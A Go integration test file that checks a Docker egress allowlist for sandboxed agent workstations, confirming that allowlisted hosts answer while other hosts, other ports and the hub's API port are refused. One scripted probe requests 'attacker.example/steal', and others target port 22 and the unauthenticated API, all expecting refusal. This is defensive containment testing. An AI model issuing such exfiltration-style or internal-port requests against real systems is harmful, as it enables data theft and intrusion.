//go:build integration

package itest

import (
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strings"
	"testing"
	"time"
)

// TestDockerEgressAllowlist is the evidence #193 asked for: from inside a
// workstation, a host off the allowlist is refused and one on it is reached.
// Two loops of the same fleet, behind the same proxy, so the difference
// between them is the allowlist and nothing else.
func TestDockerEgressAllowlist(t *testing.T) {
	allowed := startHostReachableServer(t)

	// The stand-in host is allowlisted the way an operator would allowlist
	// one: by entry, host and port together.
	s := startDockerServer(t, t.TempDir(),
		"--egress-allow", fmt.Sprintf("host.docker.internal:%d", allowed))
	s.createLoop("wsegress", nil)
	view := s.loop("wsegress")
	cleanupWorkstation(t, view.ID)

	// The proxy holds the gateway alias (that is how a loop reaches the hub),
	// so a server on the operator's own machine stands in for "a host we
	// permit" without the test needing the internet. The
	// probe is scripted rather than messaged: a directive only acts when the
	// fake is running it as its own turn, not when it arrives as text.
	s.scriptLoop("wsegress", fmt.Sprintf("!get http://host.docker.internal:%d/ok\n", allowed))
	s.message("wsegress", "reach out")
	reached := s.waitTurn("wsegress", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "get http://host.docker.internal")
	})
	if !strings.Contains(reached.ResultText, "200 OK") {
		t.Fatalf("an allowlisted host must be reachable through the proxy, got:\n%s", reached.ResultText)
	}

	// A second loop for the second probe: a loop's script is one line for
	// every turn of its life, so two probes are two loops.
	s.createLoop("wsblocked", nil)
	cleanupWorkstation(t, s.loop("wsblocked").ID)
	s.scriptLoop("wsblocked", "!get http://attacker.example/steal\n")
	s.message("wsblocked", "reach out")
	refused := s.waitTurn("wsblocked", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "attacker.example")
	})
	if !strings.Contains(refused.ResultText, "403 Forbidden") {
		t.Fatalf("a host off the allowlist must be refused, got:\n%s", refused.ResultText)
	}

	// And the allowlist is host *and* port: the same gateway that answered on
	// the entry's port is refused on another, so an entry the fleet needs —
	// the hub's — is not a tunnel to ssh or a database on the operator's
	// machine.
	s.createLoop("wsport", nil)
	cleanupWorkstation(t, s.loop("wsport").ID)
	s.scriptLoop("wsport", "!get http://host.docker.internal:22/\n")
	s.message("wsport", "reach out")
	otherPort := s.waitTurn("wsport", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "host.docker.internal:22")
	})
	if !strings.Contains(otherPort.ResultText, "403 Forbidden") {
		t.Fatalf("an allowlisted host on another port must be refused, got:\n%s", otherPort.ResultText)
	}

	// The refusal has to be the network's doing, not the proxy's goodwill:
	// the workstation is on the internal network, which has no route out at
	// all, so a client that ignores HTTP_PROXY gets nowhere either.
	network, err := dockerInspect(
		"{{range $net, $_ := .NetworkSettings.Networks}}{{$net}} {{end}}", "spool-ws-"+view.ID)
	if err != nil || strings.TrimSpace(network) != egressTestImage {
		t.Fatalf("workstation networks = %q (%v), want only %q", network, err, egressTestImage)
	}
	out, err := exec.Command("docker", "network", "inspect", "--format", "{{.Internal}}", egressTestImage).CombinedOutput()
	if internal := strings.TrimSpace(string(out)); err != nil || internal != "true" {
		t.Fatalf("egress network internal = %q (%v), want true", internal, err)
	}
}

// startHostReachableServer serves 200 on every path, bound to every interface
// so a container reaching the host gateway finds it — the harness's own API
// listens on loopback only, which nothing inside the wall can reach.
func startHostReachableServer(t *testing.T) int {
	t.Helper()
	listener, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	srv.Listener.Close()
	srv.Listener = listener
	srv.Start()
	t.Cleanup(srv.Close)
	return listener.Addr().(*net.TCPAddr).Port
}

// TestDockerWorkstationCannotReachTheAPI is the L1 safety claim itself (#238):
// from inside a real workstation, behind the real wall, the hub's loop-facing
// port answers and the hub's API port does not exist as a destination. The
// probe runs as the loop's own turn, which is the position an attacker
// steering a loop would actually be in.
func TestDockerWorkstationCannotReachTheAPI(t *testing.T) {
	s := startDockerServer(t, t.TempDir())

	// The API port is on no allowlist, so the proxy refuses it before it
	// dials anything: the loop never gets to find out the API is unauthenticated.
	s.createLoop("wsapi", nil)
	cleanupWorkstation(t, s.loop("wsapi").ID)
	s.scriptLoop("wsapi", fmt.Sprintf("!get http://host.docker.internal:%s/api/loops\n", s.port(s.baseURL)))
	s.message("wsapi", "reach the hub")
	api := s.waitTurn("wsapi", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "/api/loops")
	})
	if !strings.Contains(api.ResultText, "403 Forbidden") {
		t.Fatalf("a workstation must not reach the hub's API port, got:\n%s", api.ResultText)
	}

	// The MCP port is allowlisted, because a loop that cannot reach it cannot
	// take a turn. The 404 is the proof of both halves at once: the request
	// got through the wall to the hub's own process, and that process routes
	// no API path here.
	s.createLoop("wsmcp", nil)
	cleanupWorkstation(t, s.loop("wsmcp").ID)
	s.scriptLoop("wsmcp", fmt.Sprintf("!get http://host.docker.internal:%s/api/loops\n", s.port(s.mcpURL)))
	s.message("wsmcp", "reach the hub")
	viaMCPPort := s.waitTurn("wsmcp", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "/api/loops")
	})
	if !strings.Contains(viaMCPPort.ResultText, "404 Not Found") {
		t.Fatalf("the mcp port must be reachable and serve no API, got:\n%s", viaMCPPort.ResultText)
	}

	// Reachable is not the claim; usable is. This loop makes the call its own
	// runner configured for it — an MCP send_message to the endpoint the hub
	// handed it — so the port that answers 404 for an API path answers the
	// one thing it is there for, through the wall and the default allowlist
	// entry rather than anything this test arranged.
	s.createLoop("wssend", nil)
	cleanupWorkstation(t, s.loop("wssend").ID)
	s.scriptLoop("wssend", `!send {"destination":"control_room","text":"through the wall"}`+"\n")
	s.message("wssend", "say something")
	sent := s.waitTurn("wssend", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "sent") || strings.Contains(tr.ResultText, "send error")
	})
	if !strings.Contains(sent.ResultText, "sent") || strings.Contains(sent.ResultText, "send error") {
		t.Fatalf("a workstation must reach the hub's MCP endpoint, got:\n%s", sent.ResultText)
	}
}
